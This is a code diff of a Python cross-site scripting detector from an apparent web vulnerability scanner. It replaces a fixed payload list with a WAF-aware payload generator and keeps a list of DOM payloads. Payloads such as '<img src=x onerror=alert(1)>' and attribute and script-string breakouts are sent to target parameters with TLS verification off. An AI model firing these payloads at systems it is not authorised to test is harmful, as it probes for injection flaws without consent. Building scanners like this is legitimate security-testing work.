@@ -1,65 +1,36 @@
-import re
-from typing import Optional, List
+from typing import Optional
 import requests
 
-XSS_CONTEXT_PATTERNS = {
-    "html": [
-        r'<([^>]+)>',
-        r'<script[^>]*>.*?</script>',
-        r'on\w+\s*=',
-    ],
-    "attr": [
-        r'<input[^>]*value=["\']?',
-        r'<a[^>]*href=["\']?',
-        r'<img[^>]*src=["\']?',
-    ],
-    "js": [
-        r'var\s+\w+\s*=\s*["\']?',
-        r'\.innerHTML\s*=',
-        r'document\.write\(["\']?',
-    ],
-}
+from tools.log_utils import get_logger
+from tools.http_client import build_url
+from tools.payload_engine import generate
 
-XSS_PAYLOADS = {
-    "html": [
-        "<script>alert(1)</script>",
-        "<img src=x onerror=alert(1)>",
-        "<svg onload=alert(1)>",
-        "<body onload=alert(1)>",
-        "<input autofocus onfocus=alert(1)>",
-        "<details open ontoggle=alert(1)>",
-    ],
-    "attr": [
-        '" onfocus=alert(1) autofocus="',
-        "' onfocus=alert(1) autofocus='",
-        '" autofocus onfocus=alert(1)',
-        "' autofocus onfocus=alert(1)",
-        '" onmouseover=alert(1) "',
-    ],
-    "js": [
-        "';alert(1)//",
-        "';alert(1);'",
-        '";alert(1)//',
-        '";alert(1);"',
-        "</script><script>alert(1)</script>",
-    ],
-}
+logger = get_logger("xss_detector")
 
-REFLECTION_MARKERS = ["XSS_TEST_%d" % i for i in range(100, 130)]
+REFLECTION_MARKERS = ["XSS_TEST_%d" % i for i in range(100, 160)]
+
+
+def _is_unescaped(html: str, needle: str) -> bool:
+    if needle in html:
+        escaped = needle.replace("<", "&lt;").replace(">", "&gt;")
+        return escaped not in html or needle in html.replace(escaped, "")
+    return False
 
 
 def check(url: str, param: str, sess: Optional[requests.Session] = None,
           timeout: float = 10.0, post_body: bool = False, post_data: dict = None,
-          context: str = "all") -> dict:
+          context: str = "all", waf_name: Optional[str] = None) -> dict:
     if sess is None:
         sess = requests.Session()
-    result = {"vulnerable": False, "type": None, "evidence": [], "confirmed": False}
+    result = {"vulnerable": False, "type": None, "evidence": [], "confirmed": False,
+              "vector": None, "needs_browser_verify": False}
 
-    contexts = ["html", "attr", "js"] if context == "all" else [context]
+    contexts = ["html", "attr", "js", "angular"] if context == "all" else [context]
 
     for ctx in contexts:
-        payloads = XSS_PAYLOADS.get(ctx, [])
-        for i, payload in enumerate(payloads):
+        seeds = generate("xss", ctx, "all", waf_name)
+        for i, entry in enumerate(seeds):
+            payload = entry["payload"]
             marker = REFLECTION_MARKERS[i % len(REFLECTION_MARKERS)]
             test_payload = marker + payload
             try:
@@ -68,39 +39,45 @@ def check(url: str, param: str, sess: Optional[requests.Session] = None,
                     d[param] = test_payload
                     r = sess.post(url, data=d, timeout=timeout, verify=False)
                 else:
-                    sep = "&" if "?" in url else "?"
-                    r = sess.get("%s%s%s=%s" % (url, sep, param, test_payload),
+                    r = sess.get(build_url(url, param, test_payload),
                                  timeout=timeout, verify=False)
                 if marker in r.text:
                     result["vulnerable"] = True
-                    result["type"] = "reflected"
+                    result["type"] = "reflected_%s" % ctx
                     result["evidence"].append(
                         "reflected %s in %s (%dB)" % (ctx, param, len(r.text)))
-                    if "<script>alert(1)</script>" in r.text or "onerror=alert(1)" in r.text:
+                    result["vector"] = payload[:80]
+                    if _is_unescaped(r.text, "alert(1)"):
                         result["confirmed"] = True
                     break
-            except:
-                pass
+            except Exception as e:
+                logger.debug("xss %s payload: %s", ctx, e)
         if result["vulnerable"]:
             break
 
     if not result["vulnerable"]:
-        dom_payloads = [
-            "javascript:alert(1)",
-            "<svg/onload=alert(1)>",
-            "';alert(1);//",
+        dom_seeds = [
+            {"payload": "javascript:alert(1)"},
+            {"payload": "<svg/onload=alert(1)>"},
+            {"payload": "';alert(1);//"},
+            {"payload": "<img src=x onerror=alert(1)>"},
+            {"payload": "'-alert(1)-'"},
+            {"payload": "\\';alert(1);//"},
+            {"payload": "<script>alert(1)</script>"},
         ]
-        for payload in dom_payloads:
+        for entry in dom_seeds:
+            payload = entry["payload"]
             try:
-                sep = "&" if "?" in url else "?"
-                r = sess.get("%s%s%s=%s" % (url, sep, param, payload),
+                r = sess.get(build_url(url, param, payload),
                              timeout=timeout, verify=False)
-                if "<script>alert(1)</script>" in r.text or r.status_code == 200:
+                if _is_unescaped(r.text, "alert(1)"):
                     result["vulnerable"] = True
-                    result["type"] = "dom"
-                    result["evidence"].append("dom: %s" % payload[:30])
+                    result["type"] = "dom_possible"
+                    result["needs_browser_verify"] = True
+                    result["evidence"].append("dom_payload_reflected: %s" % payload[:30])
+                    result["vector"] = payload[:80]
                     break
-            except:
-                pass
+            except Exception as e:
+                logger.debug("xss dom payload: %s", e)
 
     return result
